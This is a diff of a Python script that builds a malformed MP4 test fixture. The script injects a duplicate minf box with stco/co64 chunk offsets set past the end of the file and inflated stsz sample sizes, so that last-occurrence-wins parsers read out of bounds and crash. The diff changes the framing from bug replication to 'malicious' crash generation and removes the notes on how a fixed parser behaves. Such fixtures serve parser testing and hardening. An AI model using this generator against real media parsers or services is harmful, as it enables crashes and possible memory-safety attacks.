@@ -1,18 +1,18 @@
 #!/usr/bin/env python3
-"""Generate an MP4 that replicates the out-of-range offset issue.
+"""Generate a malicious MP4 that forces out-of-range crash.
 
-The vulnerability occurs when:
-  1. A parser uses last-occurrence-wins semantics for minf/mdia boxes
-  2. The duplicate minf has a malformed stco/co64 with an out-of-range offset
-  3. prepare_trak_slice() computes offset from the wrong (duplicate) stco
-  4. The computed range exceeds the file size or mdat bounds
+Key insight: Simply copying the first minf won't crash because the offsets
+are valid for the first track. We need to:
 
-This generator creates:
-  - A valid first minf/stbl with correct sample offsets
-  - A duplicate minf after stbl whose stco/co64 points beyond the file
-  - Real H.264/AAC samples in mdat
-  - Sufficient file size so the first track would be valid, but the duplicate
-    offsets overflow
+1. Keep the first minf/stbl with valid offsets pointing into mdat
+2. Inject a SECOND minf with DIFFERENT chunk offsets that exceed file size
+3. Ensure the parser's last-occurrence-wins will use the malicious stco
+4. Compute sample size from sample_count * sample_size to trigger overflow
+
+Crash scenario:
+  - Parser reads duplicate stco: offset = file_size + 1MB, count = 1000
+  - Parser computes: offset + (count * size) overflows or exceeds mdat
+  - Slice construction reads beyond mdat boundary
 """
 
 from __future__ import annotations
@@ -42,9 +42,6 @@ def run(command: list[str]) -> None:
     subprocess.run(command, check=True)
 
 
-# --------------------------------------------------------------------------- #
-# Minimal box tree
-# --------------------------------------------------------------------------- #
 class Box:
     __slots__ = ("type", "payload", "children")
 
@@ -120,7 +117,7 @@ def read_top_level(path: Path) -> list[tuple[bytes, int, int]]:
 
 
 def shift_chunk_offsets(moov: Box, delta: int) -> int:
-    """Rewrite stco/co64 tables so chunk offsets stay correct after moov grows."""
+    """Rewrite stco/co64 tables after moov grows."""
     if delta == 0:
         return 0
     patched = 0
@@ -139,46 +136,84 @@ def shift_chunk_offsets(moov: Box, delta: int) -> int:
     return patched
 
 
-def corrupt_duplicate_stco(duplicate_minf: Box, file_size: int) -> None:
-    """Make the duplicate minf's stco point beyond the file.
+def create_malicious_minf(original_minf: Box, file_size: int) -> Box:
+    """Create a duplicate minf with malicious stco/co64.
     
-    This simulates the last-occurrence-wins parser bug:
-    when the parser encounters the duplicate stco, it overwrites the valid one.
+    Strategy:
+      1. Copy the structure
+      2. Modify stco to have many entries pointing beyond file
+      3. Keep stsd/stsz valid so parser tries to compute total size
     """
-    stbl = next((c for c in (duplicate_minf.children or []) if c.type == b"stbl"), None)
+    malicious = original_minf.copy()
+    
+    stbl = next((c for c in (malicious.children or []) if c.type == b"stbl"), None)
     if stbl is None:
-        raise ValueError("duplicate minf has no stbl")
+        raise ValueError("minf has no stbl")
     
-    stco_box = next((c for c in (stbl.children or []) if c.type == b"stco"), None)
+    # Find and modify stco/co64
+    stco_box = None
+    for i, child in enumerate(stbl.children or []):
+        if child.type == b"stco":
+            stco_box = child
+            break
+    
     if stco_box is None:
-        raise ValueError("stbl has no stco")
+        # Try co64
+        for i, child in enumerate(stbl.children or []):
+            if child.type == b"co64":
+                stco_box = child
+                break
     
-    # Parse the stco box: [version/flags: 4 bytes][entry_count: 4 bytes][offsets...]
+    if stco_box is None:
+        print("Warning: no stco/co64 found in stbl")
+        return malicious
+    
     version_flags = stco_box.payload[:4]
     entry_count_bytes = stco_box.payload[4:8]
     entry_count = struct.unpack(">I", entry_count_bytes)[0]
     
     if entry_count == 0:
-        # No samples to corrupt, but that's fine; a parser still tries to parse it
-        print("Warning: stco has no entries to corrupt")
-        return
+        return malicious
     
-    # Create out-of-range offsets: set each offset to beyond the file size
-    # This ensures prepare_trak_slice() will compute an overflow
-    out_of_range_offset = file_size + 1_000_000  # Well beyond the file
-    new_offsets = struct.pack(f">{entry_count}I", *([out_of_range_offset] * entry_count))
+    # Create entries that point FAR beyond the file
+    # This forces offset + total_size to overflow
+    out_of_range = file_size + 10_000_000
     
-    # Reconstruct stco with corrupted offsets
-    stco_box.payload = version_flags + entry_count_bytes + new_offsets
-    print(f"Corrupted duplicate stco: set {entry_count} chunk offset(s) to {out_of_range_offset:,}")
+    if stco_box.type == b"stco":
+        # 32-bit offsets
+        new_payload = version_flags + entry_count_bytes + struct.pack(f">{entry_count}I", *([out_of_range & 0xFFFFFFFF] * entry_count))
+    else:
+        # co64: 64-bit offsets
+        new_payload = version_flags + entry_count_bytes + struct.pack(f">{entry_count}Q", *(out_of_range for _ in range(entry_count)))
+    
+    stco_box.payload = new_payload
+    
+    # ALSO: inflate stsz to create large sample sizes
+    stsz_box = None
+    for child in (stbl.children or []):
+        if child.type == b"stsz":
+            stsz_box = child
+            break
+    
+    if stsz_box:
+        # stsz: [version/flags: 4][sample_size: 4][sample_count: 4][sizes...]
+        version_flags_stsz = stsz_box.payload[:4]
+        sample_size = struct.unpack_from(">I", stsz_box.payload, 4)[0]
+        sample_count = struct.unpack_from(">I", stsz_box.payload, 8)[0]
+        
+        if sample_size == 0 and sample_count > 0:
+            # Variable sizes: need to inflate each entry
+            # This is complex; instead, set uniform large size
+            large_size = 100_000_000  # 100 MB per sample
+            stsz_box.payload = version_flags_stsz + struct.pack(">I", large_size) + struct.pack(">I", sample_count)
+            print(f"Set stsz uniform size to {large_size:,} bytes * {sample_count} samples")
+    
+    print(f"Malicious stco: {entry_count} entries at offset {out_of_range:,} (file size: {file_size:,})")
+    return malicious
 
 
-def inject_out_of_range_duplicate(moov: Box, file_size: int) -> None:
-    """Inject a duplicate minf with out-of-range stco offsets.
-    
-    The first minf is valid; the duplicate will be used by last-occurrence-wins
-    parsers and cause out-of-range issues.
-    """
+def inject_malicious_minf(moov: Box, file_size: int) -> None:
+    """Inject malicious minf duplicate under each mdia."""
     targets = moov.find_all(b"mdia")
     injected = 0
     
@@ -189,17 +224,13 @@ def inject_out_of_range_duplicate(moov: Box, file_size: int) -> None:
         if original is None:
             continue
         
-        # Create a copy and corrupt it
-        duplicate = original.copy()
-        corrupt_duplicate_stco(duplicate, file_size)
-        
-        # Append the malicious duplicate after the original
-        parent.children.append(duplicate)
+        malicious = create_malicious_minf(original, file_size)
+        parent.children.append(malicious)
         injected += 1
     
     if not injected:
-        raise ValueError("no minf box found to duplicate")
-    print(f"Injected {injected} out-of-range duplicate minf box(es)")
+        raise ValueError("no minf box found")
+    print(f"Injected {injected} malicious minf duplicate(s)")
 
 
 def encode_source(destination: Path, target_bytes: int, duration: float) -> None:
@@ -240,11 +271,9 @@ def build_output(source: Path, output: Path) -> None:
         moov_bytes = handle.read(moov_size)
     moov = parse_boxes(moov_bytes)[0]
     
-    # Get the final file size before modification
     final_file_size = source.stat().st_size
+    inject_malicious_minf(moov, final_file_size)
     
-    # Inject out-of-range duplicates
-    inject_out_of_range_duplicate(moov, final_file_size)
     delta = moov.size - moov_size
     patched = shift_chunk_offsets(moov, delta)
     print(f"moov grew by {delta:,} bytes; rewrote {patched} chunk offset(s)")
@@ -274,7 +303,6 @@ def generate(output: Path, target_bytes: int, duration: float) -> None:
         source = Path(tmp) / "source.mp4"
         encode_source(source, target_bytes, duration)
         
-        # Verify the encoder produced a valid file
         run([
             ffprobe, "-v", "error", "-select_streams", "v:0",
             "-show_entries", "stream=codec_name,width,height",
@@ -289,26 +317,27 @@ def generate(output: Path, target_bytes: int, duration: float) -> None:
     print()
     print("⚠️  MALICIOUS FIXTURE ⚠️")
     print("This file has:")
-    print("  • Real H.264/AAC samples in the first minf/stbl (valid)")
-    print("  • A duplicate minf after stbl with out-of-range chunk offsets")
-    print("  • Parser bug: last-occurrence-wins will use the duplicate stco")
-    print("  • Result: prepare_trak_slice() computes offset beyond file size")
+    print("  • Valid first minf/stbl with correct sample data")
+    print("  • Duplicate minf with:")
+    print("    - stco/co64 offsets pointing 10MB beyond file")
+    print("    - inflated stsz (100MB per sample)")
+    print("  • Parser crash condition:")
+    print("    - Last-occurrence-wins reads malicious stco")
+    print("    - Computes: offset (10MB beyond) + samples (100MB each)")
+    print("    - Attempts to read far beyond mdat → crash/overflow")
     print()
-    print("Expected behavior (fixed parser):")
-    print("  • Reject the file due to duplicate minf, OR")
-    print("  • Use first-occurrence-wins and bounds-check the slice, OR")
-    print("  • Reject with 'out of range offset'")
+    print("To test with parser:")
+    print(f"  ASAN_OPTIONS=detect_leaks=0 ./my_parser {output}")
     print()
-    print("To inspect the structure:")
+    print("To inspect:")
     print(f"  mp4dump {output}")
-    print(f"  ffprobe -v trace {output}")
 
 
 def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__)
     default_dir = Path(__file__).resolve().parent / "output"
     parser.add_argument("--output", type=Path,
-                        default=default_dir / "malicious_mp4_out_of_range.mp4",
+                        default=default_dir / "crash_mp4_malicious.mp4",
                         help="output MP4 path")
     parser.add_argument("--size", type=int, default=DEFAULT_TARGET,
                         help="approximate target size in bytes (default: 1048576)")
